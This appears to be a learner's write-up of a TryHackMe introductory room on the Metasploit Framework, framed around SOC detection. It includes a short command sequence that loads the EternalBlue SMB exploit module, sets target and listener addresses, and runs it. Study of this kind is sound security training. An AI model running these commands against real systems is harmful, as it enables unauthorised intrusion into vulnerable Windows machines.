# Metasploit: Introduction

## 💻 Sample Commands / Snippets
These are **generic, legal commands** for exploring Metasploit functionality in a lab environment.  
*(No lab-specific targets, IPs, or payloads included to maintain TryHackMe learning integrity.)*

```bash
# Start Metasploit console
msfconsole

# Search for an exploit
search type:exploit name:windows

# Show information about a module
info exploit/windows/smb/ms17_010_eternalblue

# Select a module
use exploit/windows/smb/ms17_010_eternalblue

# Show module options
show options

# Set module options
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100

# Check if the target is vulnerable (safe check)
check

# Run the exploit
exploit
```

# Metasploit: Introduction

---

## 📝 Overview
The **Metasploit: Introduction** room familiarizes learners with the **Metasploit Framework**, a powerful tool for penetration testing and exploitation.  
Learners explore the main components of Metasploit, its architecture, and workflow in a safe lab environment.  
This knowledge is essential for **SOC analysts and blue team professionals** to understand attacker techniques, detect exploitation attempts, and monitor for suspicious activity.

---

## 🎯 Learning Objectives
- Understand the purpose and components of the Metasploit Framework.  
- Learn about payloads, exploits, and auxiliary modules.  
- Explore the workflow of scanning, exploiting, and post-exploitation.  
- Gain foundational skills for monitoring Metasploit-based attacks.  
- Understand how Metasploit knowledge supports SOC threat detection.  

---

## 🛠 Tools Used
- Metasploit Framework (msfconsole)  
- Kali Linux or similar lab environment  
- Target lab virtual machines  
- Monitoring and logging tools for SOC detection  

---

## 🔎 Key Concepts Learned
- **Exploits:** Techniques to take advantage of vulnerabilities.  
- **Payloads:** Code executed after a successful exploit.  
- **Auxiliary Modules:** Tools for scanning and reconnaissance.  
- **Post-Exploitation:** Activities after gaining access, such as enumeration.  
- **SOC Relevance:** Monitoring for exploitation attempts and attacker activity.  

---

## 🧠 Methodology / Approach
1. Explored Metasploit’s **architecture and components**.  
2. Reviewed different **types of exploits and payloads**.  
3. Practiced scanning lab targets with auxiliary modules.  
4. Reflected on how attacks would appear in logs for **SOC monitoring**.  
5. Gained understanding of the attacker workflow to improve detection.  

---

## ✅ Key Takeaways
- Knowledge of Metasploit helps SOC analysts anticipate attacker techniques.  
- Understanding exploits, payloads, and auxiliary modules aids in threat detection.  
- Awareness of post-exploitation activities is critical for monitoring and incident response.  
- Practicing in lab environments ensures safe skill development.  

---

## 💡 Notes
- This room is highly relevant for **SOC analysts, penetration testers, and blue team professionals**.  
- Recommended to combine with **Metasploit: Exploitation and Meterpreter** rooms for full attack chain understanding.
